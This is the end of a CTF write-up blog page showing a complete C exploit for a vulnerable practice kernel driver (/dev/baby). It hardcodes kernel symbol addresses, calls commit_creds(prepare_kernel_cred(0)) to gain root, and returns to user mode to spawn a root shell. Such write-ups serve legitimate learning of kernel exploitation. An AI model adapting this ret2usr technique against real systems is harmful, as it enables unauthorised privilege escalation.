<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/ioctl.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/stat.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span>


<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">KERNCALL</span> <span class="token expression"><span class="token keyword">__attribute__</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">regparm</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></span></span>
<span class="token keyword">void</span><span class="token operator">*</span> <span class="token punctuation">(</span><span class="token operator">*</span>prepare_kernel_cred<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span> KERNCALL <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token number">0xffffffff810b9d80</span><span class="token punctuation">;</span>
<span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>commit_creds<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span> KERNCALL <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token number">0xffffffff810b99d0</span><span class="token punctuation">;</span>

<span class="token keyword">unsigned</span> <span class="token keyword">long</span> user_cs<span class="token punctuation">,</span> user_ss<span class="token punctuation">,</span> user_rflags<span class="token punctuation">,</span> user_sp<span class="token punctuation">;</span>

<span class="token keyword">void</span> <span class="token function">save_usermode_status</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">asm</span><span class="token punctuation">(</span>
        <span class="token string">"movq %%cs, %0;"</span>
        <span class="token string">"movq %%ss, %1;"</span>
        <span class="token string">"movq %%rsp, %2;"</span>
        <span class="token string">"pushfq;"</span>
        <span class="token string">"popq %3;"</span>
        <span class="token operator">:</span> <span class="token string">"=r"</span> <span class="token punctuation">(</span>user_cs<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span> <span class="token punctuation">(</span>user_ss<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span> <span class="token punctuation">(</span>user_sp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span> <span class="token punctuation">(</span>user_rflags<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token operator">:</span> <span class="token string">"memory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>


<span class="token keyword">void</span> <span class="token function">get_shell</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>


<span class="token keyword">void</span> <span class="token function">payload</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token function">commit_creds</span><span class="token punctuation">(</span><span class="token function">prepare_kernel_cred</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">asm</span><span class="token punctuation">(</span>
    <span class="token string">"pushq   %0;"</span>
    <span class="token string">"pushq   %1;"</span>
    <span class="token string">"pushq   %2;"</span>
    <span class="token string">"pushq   %3;"</span>
    <span class="token string">"pushq   $get_shell;"</span>
    <span class="token string">"swapgs;"</span>
    <span class="token string">"iretq;"</span>
    <span class="token operator">::</span><span class="token string">"m"</span><span class="token punctuation">(</span>user_ss<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"m"</span><span class="token punctuation">(</span>user_sp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"m"</span><span class="token punctuation">(</span>user_rflags<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"m"</span><span class="token punctuation">(</span>user_cs<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>


<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  
  <span class="token keyword">void</span> <span class="token operator">*</span>buf<span class="token punctuation">[</span><span class="token number">0x100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token function">save_usermode_status</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">int</span> fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/baby"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>fd <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[-] Failed to open driver\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">0x100</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      buf<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">&amp;</span>payload<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token number">0x6001</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


	  <div class="article-footer-copyright">
	Ciallo～(∠・ω< )⌒★
</div>

	</div>

	
	
	<div>
  	<center>

	<div class="pagination">

    
    
    <a href="/2024/04/24/geekcon/" type="button" class="btn btn-default"><i
                class="fa fa-arrow-circle-o-left"></i> Prev</a>
    

    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
    
    <a href="/2024/03/27/nkctf-wp/" type="button" class="btn btn-default ">Next<i
                class="fa fa-arrow-circle-o-right"></i></a>
    

    
</div>


    </center>
	</div>
	
	<!-- comment -->
	<!--
<section id="comment">
    <h2 class="title">Comments</h2>

    
</section>

-->
	
	
	
	</div> <!-- col-md-9/col-md-12 -->


	
	<div id="side_meta">
		<div class="col-md-3" id="post_meta"> 

	<!-- date -->
	
	<div class="meta-widget">
	<i class="fa fa-clock-o"></i>
	2024-03-31 
	</div>
	

	<!-- categories -->
    
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
    <ul id="categorys" class="tag_box list-unstyled collapse in">
          
  <li>
    <li><a href="/categories/misc/">misc<span>7</span></a></li>
  </li>

    </ul>
	</div>
	

	<!-- tags -->
	
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
    <ul id="tags" class="tag_box list-unstyled collapse in">	  
	    
  <li><a href="/tags/misc/">misc<span>6</span></a></li>
    </ul>
	</div>
		

	<!-- toc -->
	<div class="meta-widget">
	
	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
	   <div id="toc" class="toc collapse in">
		   <span class="toc-title">Contents</span>
			<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E5%B0%9D%E8%AF%95%E7%BC%96%E8%AF%91kernel%E5%92%8C%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%EF%BC%8C%E4%BD%BF%E7%94%A8qemu%E5%90%AF%E5%8A%A8"><span class="toc-article-text">尝试编译kernel和文件系统，使用qemu启动</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#step1-make-filesystem-compile-busybox"><span class="toc-article-text">step1:make filesystem (compile busybox)</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#step2-download-compile-kernel"><span class="toc-article-text">step2:download &amp; compile kernel</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#step3-write-a-script-to-start-qemu"><span class="toc-article-text">step3: write a script to start qemu</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#ctf-challenge"><span class="toc-article-text">ctf challenge</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#xman2020-level1"><span class="toc-article-text">xman2020 level1</span></a></li></ol></li></ol>
		</div>
	
	</div>
	
    <hr>
	
</div><!-- col-md-3 -->

		

	</div>
	
		

</div><!-- row -->

<!--
 -->



	</div>
  </div>
  <div class="container-narrow">
  <footer> <p>
  
  &copy; 2025 nyyyddddn's Blog
  
      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
</p>
 </footer>
</div> <!-- container-narrow -->
  


  
<a id="gotop" href="#">   
  <span>⬆︎TOP</span>
</a>

<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script src="/js/main.js"></script>
<script src="/js/search.js"></script> 


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>



   <script type="text/javascript">      
     var search_path = "search.xml";
	 if (search_path.length == 0) {
	 	search_path = "search.xml";
	 }
	 var path = "/" + search_path;
     searchFunc(path, 'local-search-input', 'local-search-result');
   </script>

</body>
   </html>
